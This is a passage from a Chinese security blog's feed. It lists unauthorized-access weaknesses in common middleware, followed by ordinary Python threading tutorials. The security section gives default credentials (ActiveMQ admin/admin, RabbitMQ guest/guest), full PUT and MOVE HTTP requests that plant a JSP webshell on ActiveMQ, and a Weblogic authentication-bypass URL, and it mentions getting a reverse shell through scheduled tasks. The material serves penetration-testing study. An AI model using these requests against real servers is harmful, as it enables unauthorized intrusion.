class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;api&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;v1.x&#x2F;swagger-ui.html</span><br><span class="line">&#x2F;swagger&#x2F;index.html</span><br><span class="line">&#x2F;swagger-ui.html#&#x2F;api-memory-controller</span><br><span class="line">&#x2F;swagger&#x2F;ui&#x2F;</span><br><span class="line">&#x2F;swagger-ui</span><br></pre></td></tr></table></figure><h1 id="13-ActiveMQ未授权访问漏洞"><a href="#13-ActiveMQ未授权访问漏洞" class="headerlink" title="13 ActiveMQ未授权访问漏洞"></a>13 <strong>ActiveMQ未授权访问漏洞</strong></h1><p>ActiveMQ是Apache下的开源项目，是一种在分布式系统中应用程序借以传递消息的媒介，ActiveMQ默认监听在<code>8161</code>端口。</p><h2 id="漏洞详情-11"><a href="#漏洞详情-11" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>ActiveMQ默认账号密码为<code>admin/admin</code>，若服务器存在fileserver目录，则可以通过put请求写入文件，但fileserver下的文件默认不解析：</p><p>POC</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: &lt;target_IP&gt;:8161</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;81.0.4044.113 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.83.99:8161&#x2F;admin&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: JSESSIONID&#x3D;1qt95l6g0lzyg1vt89fbhhzowh</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>然后使用MOVE请求移动文件，如果是写入webshell需要做的物理路径，在<code>http://&lt;target_IP&gt;:8161/admin/test/systemProperties.jsp</code>可以查看物理路径。</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class="line">Destination:file:&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: &lt;target_IP&gt;:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>然后访问 <code>http://&lt;target_IP&gt;:8161/api/s.jsp</code>即可，如果权限足够，可以利用计划任务反弹shell。</p><h1 id="14-RabbitMQ未授权访问漏洞"><a href="#14-RabbitMQ未授权访问漏洞" class="headerlink" title="14 RabbitMQ未授权访问漏洞"></a>14 <strong>RabbitMQ未授权访问漏洞</strong></h1><p>RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。 消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。</p><h2 id="漏洞详情-12"><a href="#漏洞详情-12" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>默认账号密码<code>guest/guest</code>。</p><h1 id="15-SpringBoot应用监控Actuator未授权"><a href="#15-SpringBoot应用监控Actuator未授权" class="headerlink" title="15 SpringBoot应用监控Actuator未授权"></a>15 <strong>SpringBoot应用监控Actuator未授权</strong></h1><p>Actuator是Spring Boot提供的对应用系统的监控和管理的集成功能，可以查看应用配置的详细信息，例如自动化配置信息、创建的Spring beans信息、系统环境变量的配置信以及Web请求的详细信息等。如果使用不当或者一些不经意的疏忽，可能造成信息泄露等严重的安全隐患。</p><h2 id="漏洞详情-13"><a href="#漏洞详情-13" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>直接访问以下路径：</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dump - 显示线程转储（包括堆栈跟踪）</span><br><span class="line">&#x2F;autoconfig - 显示自动配置报告</span><br><span class="line">&#x2F;configprops - 显示配置属性</span><br><span class="line">&#x2F;trace - 显示最后几条HTTP消息（可能包含会话标识符）</span><br><span class="line">&#x2F;logfile - 输出日志文件的内容</span><br><span class="line">&#x2F;shutdown - 关闭应用程序</span><br><span class="line">&#x2F;info - 显示应用信息</span><br><span class="line">&#x2F;metrics - 显示当前应用的’指标’信息</span><br><span class="line">&#x2F;health - 显示应用程序的健康指标</span><br><span class="line">&#x2F;beans - 显示Spring Beans的完整列表</span><br><span class="line">&#x2F;mappings - 显示所有MVC控制器映射</span><br><span class="line">&#x2F;env - 提供对配置环境的访问</span><br><span class="line">&#x2F;restart - 重新启动应用程序</span><br></pre></td></tr></table></figure><h1 id="16-Dubbo未授权访问漏洞"><a href="#16-Dubbo未授权访问漏洞" class="headerlink" title="16 Dubbo未授权访问漏洞"></a>16 <strong>Dubbo未授权访问漏洞</strong></h1><p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p><h3 id="漏洞详情-14"><a href="#漏洞详情-14" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>使用命令：<code>telnet &lt;target_IP&gt; prot</code>：</p><h1 id="17-Zabbix未授权访问漏洞"><a href="#17-Zabbix未授权访问漏洞" class="headerlink" title="17 Zabbix未授权访问漏洞"></a>17 Zabbix未授权访问漏洞</h1><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p><h2 id="漏洞详情-15"><a href="#漏洞详情-15" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>访问路径： <code>http://IP:Port/zabbix.php?action=dashboard.view&amp;dashboardid=1</code></p><h1 id="18-Weblogic-未授权访问"><a href="#18-Weblogic-未授权访问" class="headerlink" title="18 Weblogic 未授权访问"></a>18 Weblogic 未授权访问</h1><p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h2 id="漏洞详情-16"><a href="#漏洞详情-16" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>访问ip/console/images/%252E%252E%252Fconsole.portal</code>即可绕过认证，并且功能点都能正常使用</p><h1 id="19-Solr-未授权访问"><a href="#19-Solr-未授权访问" class="headerlink" title="19 Solr 未授权访问"></a>19 Solr 未授权访问</h1><p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。</p><h2 id="漏洞详情-17"><a href="#漏洞详情-17" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>直接访问</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;solr&#x2F;admin</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;solr&#x2F;admin</span><br></pre></td></tr></table></figure><h2 id="ps-整理的不全，后续继续补充"><a href="#ps-整理的不全，后续继续补充" class="headerlink" title="ps:整理的不全，后续继续补充~"></a>ps:整理的不全，后续继续补充~</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见的未授权访问-md&quot;&gt;&lt;a href=&quot;#常见的未授权访问-md&quot; class=&quot;headerlink&quot; title=&quot;常见的未授权访问.md&quot;&gt;&lt;/a&gt;常见的未授权访问.md&lt;/h1&gt;&lt;h1 id=&quot;1-Redis未授权访问&quot;&gt;&lt;a href=&quot;#1-Red</summary>
      
    
    
    
    <category term="Web渗透" scheme="http://nice759.com/Categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="未授权访问" scheme="http://nice759.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>python多线程实例</title>
    <link href="http://nice759.com/2022/03/24/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E4%BE%8B/"/>
    <id>http://nice759.com/2022/03/24/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E4%BE%8B/</id>
    <published>2022-03-24T04:28:15.000Z</published>
    <updated>2022-03-25T09:19:59.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="自定义的线程类"><a href="#自定义的线程类" class="headerlink" title="自定义的线程类"></a>自定义的线程类</h1><p>具体效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建一个线程类</span><br><span class="line">class myThread (threading.Thread):</span><br><span class="line">    def __init__(self, name, q):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">        self.name &#x3D; name  # 线程id</span><br><span class="line">        self.q &#x3D; q # 队列</span><br><span class="line">    def run(self):</span><br><span class="line">        print (&quot;开启线程：&quot; + self.name) # 为了直观的看到每个线程的开始</span><br><span class="line">        process_data(self.name, self.q)  #执行处理函数</span><br><span class="line">        print (&quot;退出线程：&quot; + self.name) # 为了直观的看到每个线程的结束</span><br><span class="line"></span><br><span class="line">#处理函数</span><br><span class="line">def process_data(threadName, q):</span><br><span class="line">    while not exitFlag:</span><br><span class="line">        queueLock.acquire() # 获得锁</span><br><span class="line">        if not workQueue.empty():</span><br><span class="line">            data &#x3D; q.get() # 获取队列数据</span><br><span class="line">            queueLock.release() # 释放锁</span><br><span class="line">            print (&quot;%s processing %s %s&quot; % (threadName, data, time.ctime())) # 输出线程id，线程处理的数据，开始处理数据的时间点</span><br><span class="line">            time.sleep(1) # 每个线程sleep 1s</span><br><span class="line">            #print(&quot;%s processing-end %s %s&quot; % (threadName, data, time.ctime()))</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            queueLock.release()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    exitFlag &#x3D; 0 # False</span><br><span class="line">    queueLock &#x3D; threading.Lock() #锁</span><br><span class="line">    workQueue &#x3D; queue.Queue()  #设置队列</span><br><span class="line">    threads &#x3D; [] #设置线程池</span><br><span class="line"></span><br><span class="line">    for i in range(10): #10个线程</span><br><span class="line">        thread &#x3D; myThread(i,workQueue) # 传输到自定义对象中的数据</span><br><span class="line">        thread.start() # 开启线程</span><br><span class="line">        threads.append(thread) # 把线程加入到线程池</span><br><span class="line"></span><br><span class="line">    # 填充队列</span><br><span class="line"></span><br><span class="line">    queueLock.acquire() # 确保只有一个线程能成功地获取锁</span><br><span class="line">    for i in range(100):</span><br><span class="line">        word &#x3D; i</span><br><span class="line">        workQueue.put(word)</span><br><span class="line">    queueLock.release() # 释放锁</span><br><span class="line"></span><br><span class="line">    # 等待队列清空</span><br><span class="line">    while not workQueue.empty():</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    # 通知线程是时候退出</span><br><span class="line">    exitFlag &#x3D; 1 # True</span><br><span class="line"></span><br><span class="line">    # 等待所有线程完成</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print (&quot;退出主线程&quot;)</span><br></pre></td></tr></table></figure><h1 id="非自定义"><a href="#非自定义" class="headerlink" title="非自定义"></a>非自定义</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#处理函数</span><br><span class="line">def process_data():</span><br><span class="line">    while not exitFlag:</span><br><span class="line">        queueLock.acquire() # 获得锁</span><br><span class="line">        if not workQueue.empty():</span><br><span class="line">            data &#x3D; workQueue.get() # 获取队列数据</span><br><span class="line">            queueLock.release() # 释放锁</span><br><span class="line">            time.sleep(1)  # 每个线程sleep 1s</span><br><span class="line">            print (&quot; processing %s %s&quot; % (data, time.ctime())) # 输出线程id，线程处理的数据，开始处理数据的时间点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            queueLock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">    exitFlag &#x3D; 0  # False</span><br><span class="line">    queueLock &#x3D; threading.Lock()  # 锁</span><br><span class="line">    workQueue &#x3D; queue.Queue()  # 设置队列</span><br><span class="line">    threads &#x3D; []  # 设置线程池</span><br><span class="line"></span><br><span class="line">    # 填充队列</span><br><span class="line">    queueLock.acquire()  # 确保只有一个线程能成功地获取锁</span><br><span class="line">    for i in range(100):</span><br><span class="line">        word &#x3D; i</span><br><span class="line">        workQueue.put(word)</span><br><span class="line">    queueLock.release()  # 释放锁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(10): #10个线程</span><br><span class="line">        thread &#x3D; threading.Thread(target&#x3D;process_data) # 传输到自定义对象中的数据</span><br><span class="line">        thread.start() # 开启线程</span><br><span class="line">        threads.append(thread) # 把线程加入到线程池</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 等待队列清空</span><br><span class="line">    while not workQueue.empty():</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    # 通知线程是时候退出</span><br><span class="line">    exitFlag &#x3D; 1 # True</span><br><span class="line"></span><br><span class="line">    # 等待所有线程完成</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print (&quot;退出主线程&quot;)</span><br></pre></td></tr></table></figure><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>以上两种方式看着没有什么问题，但是运行完之后会出现一些错误，经过一番折腾，发现是加锁的地方存在一些问题，所以再一次调整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyThread(threading.Thread):</span><br><span class="line">    # 重写init和run方法(参数：线程名称)</span><br><span class="line">    def __init__(self):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print_time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def print_time():</span><br><span class="line">    while not exitFlag:</span><br><span class="line">        # 开启锁 (不加锁则是同时执行，加锁则是一个一个执行)</span><br><span class="line">        threadLock.acquire()</span><br><span class="line">        if not workQueue.empty():</span><br><span class="line">            # 获取队列</span><br><span class="line">            index &#x3D; workQueue.get()</span><br><span class="line">            with open(&#39;res.txt&#39;, &#39;a+&#39;) as f2:</span><br><span class="line">                f2.writelines(&quot;processing %s %s&quot; % (index+1, time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;, time.localtime())) + &#39;\n&#39;)</span><br><span class="line">        # 释放锁</span><br><span class="line">        threadLock.release()</span><br><span class="line">        # time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建线程锁</span><br><span class="line">threadLock &#x3D; threading.Lock()</span><br><span class="line"># 创建队列</span><br><span class="line">workQueue &#x3D; queue.Queue()</span><br><span class="line">threads &#x3D; []</span><br><span class="line">exitFlag &#x3D; 0</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    # 创建线程</span><br><span class="line">    # for tName in threadsName:</span><br><span class="line">    for k in range(10):</span><br><span class="line">        thread &#x3D; MyThread()</span><br><span class="line">        # 执行线程</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    # 填充队列</span><br><span class="line">    for num in range(100):</span><br><span class="line">        print(num)</span><br><span class="line">        workQueue.put(num)</span><br><span class="line"></span><br><span class="line">    # 等待队列清空</span><br><span class="line">    while not workQueue.empty():</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    # 结束</span><br><span class="line">    exitFlag &#x3D; 1</span><br><span class="line"></span><br><span class="line">    # 等待所有线程执行完成</span><br><span class="line">    for i in threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line">    print(&#39;退出主线程！&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;自定义的线程类&quot;&gt;&lt;a href=&quot;#自定义的线程类&quot; class=&quot;headerlink&quot; title=&quot;自定义的线程类&quot;&gt;&lt;/a&gt;自定义的线程类&lt;/h1&gt;&lt;p&gt;具体效果&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    <category term="python" scheme="http://nice759.com/Categories/python/"/>
    
    
    <category term="python" scheme="http://nice759.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python:多线程(threading)</title>
    <link href="http://nice759.com/2022/03/23/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B(threading)/"/>
    <id>http://nice759.com/2022/03/23/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B(threading)/</id>
    <published>2022-03-23T04:28:15.000Z</published>
    <updated>2022-03-23T10:53:38.569Z</updated>
    
    <content type="html"><![CDATA[<h1 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h1><p>Python的线程操作在旧版本中使用的是thread模块，在Python27和Python3中引入了threading模块，同时thread模块在Python3中改名为_thread模块，threading模块相较于thread模块，对于线程的操作更加的丰富，而且threading模块本身也是相当于对thread模块的进一步封装而成，thread模块有的功能threading模块也都有，所以涉及到多线程的操作，推荐使用threading模块。<br>threading模块中包含了关于线程操作的丰富功能，包括：常用线程函数，线程对象，锁对象，递归锁对象，事件对象，条件变量对象，信号量对象，定时器对象，栅栏对象。</p><h1 id="threading函数"><a href="#threading函数" class="headerlink" title="threading函数"></a>threading函数</h1><p>通常情况下，Python程序启动时，Python解释器会启动一个继承自threading.Thread的threading._MainThread线程对象作为主线程，所以涉及到threading.Thread的方法和函数时通常都算上了这个主线程的，比如在启动程序时打印threading.active_count()的结果就已经是1了。</p><ul><li>**threading.active_count()**：返回当前存活的threading.Thread线程对象数量，等同于len(threading.enumerate())。</li><li>**threading.current_thread()**：返回此函数的调用者控制的threading.Thread线程对象。如果当前调用者控制的线程不是通过- —- -threading.Thread创建的，则返回一个功能受限的虚拟线程对象。</li><li>**threading.get_ident()**：返回当前线程的线程标识符。注意当一个线程退出时，它的线程标识符可能会被之后新创建的线程复用。</li><li>**threading.enumerate()**：返回当前存活的threading.Thread线程对象列表。</li><li>**threading.main_thread()**：返回主线程对象，通常情况下，就是程序启动时Python解释器创建的threading._MainThread线程对象。</li><li>**threading.stack_size([size])**：返回创建线程时使用的堆栈大小。也可以使用可选参数size指定之后创建线程时的堆栈大小，size可以是0或者一个不小于32KiB的正整数。如果参数没有指定，则默认为0。如果系统或者其他原因不支持改变堆栈大小，则会报RuntimeError错误；如果指定的堆栈大小不合法，则会报ValueError，但并不会修改这个堆栈的大小。32KiB是保证能解释器运行的最小堆栈大小，当然这个值会因为系统或者其他原因有限制，比如它要求的值是大于32KiB的某个值，只需根据要求修改即可。<h1 id="线程对象：threading-Thread"><a href="#线程对象：threading-Thread" class="headerlink" title="线程对象：threading.Thread"></a>线程对象：threading.Thread</h1></li></ul><p><strong>threading.Thread</strong>目前还没有优先级和线程组的功能，而且创建的线程也不能被销毁、停止、暂定、恢复或中断。</p><h2 id="守护线程："><a href="#守护线程：" class="headerlink" title="守护线程："></a>守护线程：</h2><p>只有所有守护线程都结束，整个Python程序才会退出，但并不是说Python程序会等待守护线程运行完毕，相反，当程序退出时，如果还有守护线程在运行，程序会去强制终结所有守护线程，当守所有护线程都终结后，程序才会真正退出。可以通过修改daemon属性或者初始化线程时指定daemon参数来指定某个线程为守护线程。</p><h2 id="非守护线程："><a href="#非守护线程：" class="headerlink" title="非守护线程："></a>非守护线程：</h2><p>一般创建的线程默认就是非守护线程，包括主线程也是，即在Python程序退出时，如果还有非守护线程在运行，程序会等待直到所有非守护线程都结束后才会退出。</p><p>注：守护线程会在程序关闭时突然关闭（如果守护线程在程序关闭时还在运行），它们占用的资源可能没有被正确释放，比如正在修改文档内容等，需要谨慎使用。</p><p>threading.Thread(group=None, target=None, name=None, args=(), kwargs={}, *, daemon=None)</p><p>如果这个类的初始化方法被重写，请确保在重写的初始化方法中做任何事之前先调用threading.Thread类的__init__方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- group：应该设为None，即不用设置，使用默认值就好，因为这个参数是为了以后实现ThreadGroup类而保留的。</span><br><span class="line">- target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法。</span><br><span class="line">- name：线程名称，默认为“Thread-N”形式的名称，N为较小的十进制数。</span><br><span class="line">- args：在参数target中传入的可调用对象的参数元组，默认为空元组()。</span><br><span class="line">- kwargs：在参数target中传入的可调用对象的关键字参数字典，默认为空字典&#123;&#125;。</span><br><span class="line">- 